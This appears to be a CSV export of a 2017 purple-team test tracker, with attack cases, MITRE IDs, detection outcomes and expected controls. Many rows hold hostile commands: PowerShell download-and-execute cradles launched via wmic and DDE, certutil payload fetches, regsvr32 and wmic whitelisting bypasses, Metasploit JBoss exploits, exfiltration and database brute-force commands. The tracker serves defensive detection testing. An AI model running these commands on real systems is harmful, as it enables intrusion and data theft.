Enterprise Purple – 2017 Q1,App Server Discovery and Exploitation,Exploitation,Targeted Scans and Fuzzing - JBoss,T1068,,Web application probing,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious internal scanning is detected by firewall/IDS/IPS, UEBA tool, or honeypot technology,2) Event logs for commonly targeted application server platforms are ingested to SIEM for further analysis and alerting on suspicious activity (e.g. intrusion attempts to Tomcat, Jenkins, JBoss, critical business applications, SSO services, etc.)",,,,,2017-01-18T05:56:38.930Z,1484718998930,2017-01-18T07:07:57.930Z,1484723277930,2017-01-18T07:36:56.930Z,1484725016930,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.","Scanner:
msf> use auxiliary/scanner/http/jboss_vulnscan

JMX Console Deployer Upload and Execute:
msf> use exploit/multi/http/jboss_maindeployer",,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q1,App Server Discovery and Exploitation,Discovery,Targeted Scans and Fuzzing - Target Group 2,T1046,,Web application probing,Completed,NotDetected,TBD,TBD,Yes,,,,,SIEM,,2017-01-18T10:44:33.930Z,1484736273930,2017-01-18T11:39:53.930Z,1484739593930,2017-01-18T13:35:26.930Z,1484746526930,Security Risk Advisors,,"Run targeted scanning of dynamic web pages with tools such as Burp's Active Scan to look for common vulnerabilities (e.g. OWASP top 10) including SQLi, command injection, XSS and default credentials on popular application web consoles such as JBoss and Tomcat.",Use burp active scan,,High,High,Internal,Medium,,,,"Manual Techniques,BurpSuite"
Enterprise Purple – 2017 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTP C2,T1041,,Exfil data using common network protocols,Completed,Detected,High,TBD,TBD,,,,,"Web Gateway,DLP,Firewall",Microcosm,2017-01-21T21:15:31.930Z,1485033331930,2017-01-21T21:39:26.930Z,1485034766930,2017-01-21T21:48:17.930Z,1485035297930,Security Risk Advisors,,Extract data from the network over HTTP tcp/80 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over established HTTPS C2,T1041,,Exfil data using common network protocols,Completed,NotDetected,TBD,TBD,No,,1) HTTPS / SSL/TLS decryption is enabled in proxy or firewall appliances,,,"Web Gateway,Firewall",,2017-01-21T21:57:44.930Z,1485035864930,2017-01-21T23:00:05.930Z,1485039605930,2017-01-22T00:40:49.930Z,1485045649930,Security Risk Advisors,,Extract data from the network over HTTP tcp/443 to external host or IP.,"# HTTPS Server
./Egress-Assess.py --server https

# HTTPS Client
Invoke-EgressAssess -Client HTTPS -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over SSH/SCP/SFTP protocol,T1048,,Exfil data using common network protocols,Completed,NotDetected,TBD,TBD,Yes,,,,,Firewall,,2017-01-21T18:52:41.930Z,1485024761930,2017-01-21T20:31:32.930Z,1485030692930,2017-01-21T21:15:02.930Z,1485033302930,Security Risk Advisors,,Extract data from the network over HTTP tcp/22 to external host or IP.,"# FTP Server
./Egress-Assess.py --server sftp --username <username> --password <password>

# FTP Client
Invoke-EgressAssess -Client SFTP -IP <IP or Domain> -Datatype <Data Type> -Size 20 -Loops 5 -Fast -Verbose -NoPing -Username <username> -Password <password>",,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q1,Data Exfil Methods - Network,Exfiltration,Extract sensitive data over FTP protocol,T1048,,Exfil data using common network protocols,Completed,Blocked,TBD,No,TBD,,1) Sensitive data sent over common network protocol is detected by proxy or DLP tool,,,"DLP,Firewall",Gunhed,2017-01-21T14:13:30.930Z,1485008010930,2017-01-21T16:09:05.930Z,1485014945930,2017-01-21T17:08:55.930Z,1485018535930,Security Risk Advisors,,Extract data from the network over HTTP tcp/21 to external host or IP.,,,High,High,Both,Low,,,,Egress-Assess
Enterprise Purple – 2017 Q1,Physical Access,Exploitation,Laptop or workstation boot attack,T1091,,Workstation Local Attack,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2017-01-15T23:23:17.930Z,1484522597930,2017-01-15T23:41:57.930Z,1484523717930,2017-01-16T01:20:05.930Z,1484529605930,Security Risk Advisors,,Attempt cold boot on laptops with missing or partial FDE,Load kali on boot-able usb,,Low,High,Both,Medium,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Physical Access,Exploitation,Locked workstation attack,T1200,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload run from bashbunny device is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2017-01-15T13:50:54.930Z,1484488254930,2017-01-15T15:21:53.930Z,1484493713930,2017-01-15T15:26:51.930Z,1484494011930,Security Risk Advisors,,"Setup rogue DHCP server and connect to laptop in locked state, intercept credentials using Responder tool.",Use bashbunny with responder loaded,,Low,High,Both,Medium,,,,"Responder,Manual Techniques"
Enterprise Purple – 2017 Q1,Physical Access,Exploitation,USB Rubby Ducky,T1091,,Workstation Local Attack,Completed,NotDetected,TBD,TBD,No,,1) Payload from rubber ducky is detected by EDR and/or SIEM rules,,,"SIEM,EDR,Secure Baselines",,2017-01-15T19:42:10.930Z,1484509330930,2017-01-15T21:19:47.930Z,1484515187930,2017-01-15T22:47:54.930Z,1484520474930,Security Risk Advisors,,Attack local laptop/workstation using USB device to execute malicious code.,cmd /c \\<share>\<folder>\file.bat,,Medium,High,Internal,High,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2017 Q1,Physical Access,Exploitation,Mouse Jacking,T1200,,Wireless Attack,Completed,NotDetected,TBD,TBD,No,,1) Established C2 payload from mouse jacker payload is detected by EDR tool and/or SIEM events.,,,"SIEM,EDR,Secure Baselines",,2017-01-15T16:59:57.930Z,1484499597930,2017-01-15T17:54:08.930Z,1484502848930,2017-01-15T18:35:49.930Z,1484505349930,Security Risk Advisors,,Attack local laptop via preexisting vulnerable USB mouse dongle.,jackit --script <Ducky_Script>,,Low,High,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike,JackIt"
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - CMD,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,,,,EDR,,2017-01-14T12:45:20.930Z,1484397920930,2017-01-14T12:47:11.930Z,1484398031930,2017-01-14T14:46:46.930Z,1484405206930,Security Risk Advisors,,Run an obfuscated CMD command to run a malicious command.,invoke-dosfuscation -> run command,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,PowerShell Downgrade,T1059.001,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-14T15:05:44.930Z,1484406344930,2017-01-14T17:03:05.930Z,1484413385930,2017-01-14T19:00:02.930Z,1484420402930,Security Risk Advisors,,Execute PowerShell in a degraded version to avoid security controls in newer versions.,powershell.exe -v 2,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using MSBuild,,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-14T06:00:38.930Z,1484373638930,2017-01-14T07:22:14.930Z,1484378534930,2017-01-14T09:05:43.930Z,1484384743930,Security Risk Advisors,,Spawn a new process using MSBuild.,msbuild.exe <path to xml file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using PowerShell,T1059.001,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-13T17:11:48.930Z,1484327508930,2017-01-13T18:14:41.930Z,1484331281930,2017-01-13T18:15:39.930Z,1484331339930,Security Risk Advisors,,Spawn a new process using PowerShell.,powershell.exe <run command>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using Regsvr32,T1218.010,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-01-13T13:29:37.930Z,1484314177930,2017-01-13T14:00:26.930Z,1484316026930,2017-01-13T15:01:51.930Z,1484319711930,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with Regsvr32 (Squiblydoo).,regsvr32 /s /n /u /i:<path to scriptlet> scrobj.dll,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using VBS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-14T02:49:47.930Z,1484362187930,2017-01-14T03:35:08.930Z,1484364908930,2017-01-14T04:02:44.930Z,1484366564930,Security Risk Advisors,,Spawn a new process using VBS.,cscript <path to vbs file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using JS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-13T23:21:04.930Z,1484349664930,2017-01-14T00:06:32.930Z,1484352392930,2017-01-14T01:25:35.930Z,1484357135930,Security Risk Advisors,,Spawn a new process using JS.,cscript <path to js file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using HTA,T1218.005,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-01-13T15:04:17.930Z,1484319857930,2017-01-13T15:51:54.930Z,1484322714930,2017-01-13T16:56:24.930Z,1484326584930,Security Risk Advisors,,Spawn a new process using HTA.,mshta <full path to hta>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-13T18:28:10.930Z,1484332090930,2017-01-13T20:07:35.930Z,1484338055930,2017-01-13T21:56:32.930Z,1484344592930,Security Risk Advisors,,Spawn a new process using WMI.,"wmic process call create ""powershell -nop -c 'IEX ((new-object net.webclient).downloadstring(https://somedomain/1234))'""",,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Obfuscated Commands - PowerShell,T1059.001,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-14T10:03:32.930Z,1484388212930,2017-01-14T11:50:21.930Z,1484394621930,2017-01-14T12:15:34.930Z,1484396134930,Security Risk Advisors,,Run an obfuscated PowerShell command to run a malicious command.,invoke-obfuscation -> run command,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2017 Q1,Suspicious Process Execution,Exploitation,Process Creation Using WMI Format Table,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-01-14T19:36:36.930Z,1484422596930,2017-01-14T20:36:26.930Z,1484426186930,2017-01-14T20:57:41.930Z,1484427461930,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with WMI Format Table (Squiblytoo).,wmic os get /format:<url to xsl file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,4 - Macro - WScript EXE,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-01-12T03:01:25.930Z,1484190085930,2017-01-12T03:41:38.930Z,1484192498930,2017-01-12T04:00:14.930Z,1484193614930,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,7 - Macro - MMG WMI Exe,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-01-12T08:52:14.930Z,1484211134930,2017-01-12T09:40:55.930Z,1484214055930,2017-01-12T09:41:18.930Z,1484214078930,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,8 - Macro - LuckyStrike PowerShell CellEmbed,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-01-11T12:53:44.930Z,1484139224930,2017-01-11T14:16:52.930Z,1484144212930,2017-01-11T14:57:08.930Z,1484146628930,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,6 - Macro - MMG WMI PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2017-01-12T05:17:04.930Z,1484198224930,2017-01-12T06:19:34.930Z,1484201974930,2017-01-12T08:05:16.930Z,1484208316930,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,1 - Macro - Cobalt Strike Standard,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2017-01-11T00:27:59.930Z,1484094479930,2017-01-11T00:30:54.930Z,1484094654930,2017-01-11T02:37:22.930Z,1484102242930,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Generate MS Office Macro from cobalt Strike (Attacks -> Packages -> MS Office Macro)

Put macro in office document

Execute the office document on endpoint",,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,2 - Macro - CobaltStrike Standard (MMG),T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-01-11T23:38:27.930Z,1484177907930,2017-01-12T00:00:00.930Z,1484179200930,2017-01-12T01:30:52.930Z,1484184652930,Security Risk Advisors,,Execute malicious Office document on the endpoint,python MMG.py [config] [output],,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,11 - DDE - Exe,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-01-11T17:45:25.930Z,1484156725930,2017-01-11T19:11:53.930Z,1484161913930,2017-01-11T20:54:40.930Z,1484168080930,Security Risk Advisors,,Execute malicious Office document on the endpoint,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,9 - Macro - MSBuild,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-01-11T10:32:38.930Z,1484130758930,2017-01-11T12:27:59.930Z,1484137679930,2017-01-11T12:44:33.930Z,1484138673930,Security Risk Advisors,,Execute malicious Office document on the endpoint,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,5 - Macro - WScript PowerShell XOR,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2017-01-11T06:31:19.930Z,1484116279930,2017-01-11T07:50:26.930Z,1484121026930,2017-01-11T08:37:48.930Z,1484123868930,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,3 - Macro - WScript PowerShell,T1203,,Client-side Execution,Completed,Blocked,TBD,No,TBD,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection,Secure Baselines",Donpachi,2017-01-11T03:26:27.930Z,1484105187930,2017-01-11T03:42:17.930Z,1484106137930,2017-01-11T05:36:24.930Z,1484112984930,Security Risk Advisors,,Execute malicious Office document on the endpoint,Copy macro template into office document,,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,10 - DDE - PowerShell,T1203,,Client-side Execution,Completed,NotDetected,TBD,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-01-11T15:01:56.930Z,1484146916930,2017-01-11T15:24:58.930Z,1484148298930,2017-01-11T17:23:59.930Z,1484155439930,Security Risk Advisors,,Execute malicious Office document on the endpoint,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Malicious Document Execution,Execution,12 - Macro - Remote Template,T1203,,Client-side Execution,Completed,NotDetected,High,TBD,No,,1) Document payload execution is detected by EDR or endpoint protection tool,,,"EDR,Endpoint Protection",,2017-01-11T21:04:55.930Z,1484168695930,2017-01-11T21:35:47.930Z,1484170547930,2019-01-29T08:26:11.611Z,1548750371611,Security Risk Advisors,,Execute malicious Office document on the endpoint,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,Internal,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Database Assault,Exploitation,Fingerprint and brute force MySQL databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2017-01-19T14:57:55.930Z,1484837875930,2017-01-19T15:41:16.930Z,1484840476930,2017-01-19T15:56:35.930Z,1484841395930,Security Risk Advisors,,Attempt to exploit insecurely configured MySQL databases on the network.,,,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2017 Q1,Database Assault,Exploitation,Fingerprint and brute force DB2 databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2017-01-19T21:59:45.930Z,1484863185930,2017-01-19T23:40:51.930Z,1484869251930,2017-01-20T01:34:24.930Z,1484876064930,Security Risk Advisors,,Attempt to exploit insecurely configured IBM DB2 databases on the network.,"nmap -sS -Pn -p1433,1521,1526,3306,523 --randomize-hosts -g 53 --open --script=broadcast-ms-sql-discover.nse,broadcast-db2-discover.nse,ms-sql-empty-password.nse,mysql-empty-password.nse, -oA output IPADDRESS",,High,High,Internal,Low,,,,"Nmap,Metasploit"
Enterprise Purple – 2017 Q1,Database Assault,Exploitation,Fingerprint and brute force Oracle databases,T1110,,Database exploitation,Completed,NotDetected,TBD,TBD,No,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by Database Activity Monitoring tool",,,,,2017-01-19T17:46:31.930Z,1484847991930,2017-01-19T18:49:22.930Z,1484851762930,2017-01-19T20:39:52.930Z,1484858392930,Security Risk Advisors,,Attempt to exploit insecurely configured Oracle databases on the network.,,,High,High,Internal,Low,,,,"Oscanner,Nmap,Metasploit"
Enterprise Purple – 2017 Q1,Database Assault,Exfiltration,Pilfer sensitive data from compromised DBs,,,Database access,Completed,NotDetected,TBD,TBD,Yes,,"1) SIEM rules are configured to alert on suspicious logons to critical DB servers and databases.,2) Database activity monitoring tool or triggers are configured for highly sensitive DB tables and columns.,3) DLP tool successfully detects sensitive data movement from the server or leaving the network.",,,DLP,,2017-01-20T02:55:41.930Z,1484880941930,2017-01-20T03:15:59.930Z,1484882159930,2017-01-20T05:15:59.930Z,1484889359930,Security Risk Advisors,,Pilfer sensitive data from compromised DBs and send it outside the network.,,,Medium,High,Both,Medium,,,,
Enterprise Purple – 2017 Q1,Database Assault,Exploitation,Fingerprint and brute force MS SQL Server instances,T1110,,Database exploitation,Completed,Detected,High,TBD,TBD,,"1) Database logs are ingested to SIEM, alerts are configured for database failed login attempts,2) Failed database logins are detected by SIEM or Database Activity Monitoring tool",,,SIEM,Progear,2017-01-19T12:20:00.930Z,1484828400930,2017-01-19T12:39:45.930Z,1484829585930,2017-01-19T13:27:43.930Z,1484832463930,Security Risk Advisors,,Attempt to exploit insecurely configured MS SQL Server databases on the network.,"Metasploit recon:
use auxiliary/scanner/mssql/mssql_ping

Nmap recon:
nmap -p 445 --script ms-sql-info <host>

Nmap brute force:
nmap -p 445 --script ms-sql-brute --script-args mssql.instance-all,userdb=customuser.txt,passdb=custompass.txt <host>
nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt <host>",,High,High,Internal,Low,,,,"Nmap,SQLping3,Metasploit"
Enterprise Purple – 2017 Q1,Database Assault,Discovery,"Internal - Moderate Port Scan with 5 ports, service enumeration, and NSE's",T1046,,Port scanning,Completed,NotDetected,TBD,TBD,Yes,,"1) Internal port scanning activity detect by potential firewall/IDS/IPS, UEBA tool, or honeypot technology",,,"Firewall,Behavior Analytics",,2017-01-19T11:08:15.930Z,1484824095930,2017-01-19T12:02:15.930Z,1484827335930,2017-01-19T12:16:21.930Z,1484828181930,Security Risk Advisors,,Identify open ports and services for common DBMS platforms,,,High,Low,Both,Low,,,,Nmap
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,14 - Macro - Remote Template,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-05T16:11:36.930Z,1483632696930,2017-01-05T17:33:34.930Z,1483637614930,2017-01-05T17:48:44.930Z,1483638524930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,16 - Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-05T19:39:59.930Z,1483645199930,2017-01-05T21:28:59.930Z,1483651739930,2017-01-05T22:43:11.930Z,1483656191930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,3 - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-06T21:25:51.930Z,1483737951930,2017-01-06T22:03:28.930Z,1483740208930,2017-01-06T22:37:11.930Z,1483742231930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,18 - Encrypted Archive - Macro,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-05T23:43:12.930Z,1483659792930,2017-01-06T00:27:24.930Z,1483662444930,2017-01-06T02:03:41.930Z,1483668221930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,7 - Macro - WScript PowerShell XOR,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-07T14:36:35.930Z,1483799795930,2017-01-07T14:51:48.930Z,1483800708930,2017-01-07T16:29:59.930Z,1483806599930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,12 - Macro - MMG WMI Exe,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-07T20:25:13.930Z,1483820713930,2017-01-07T21:20:03.930Z,1483824003930,2017-01-07T22:09:15.930Z,1483826955930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,15 - Archive - Macro,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-08T00:04:26.930Z,1483833866930,2017-01-08T00:22:30.930Z,1483834950930,2017-01-08T01:34:21.930Z,1483839261930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,1 - Macro - Cobalt Strike Standard,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-01-05T05:44:11.930Z,1483595051930,2017-01-05T06:46:44.930Z,1483598804930,2017-01-05T08:03:34.930Z,1483603414930,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q1,Email With Malicious Attachments,Delivery,17 - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-01-08T01:39:22.930Z,1483839562930,2017-01-08T01:43:11.930Z,1483839791930,2017-01-08T02:47:54.930Z,1483843674930,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
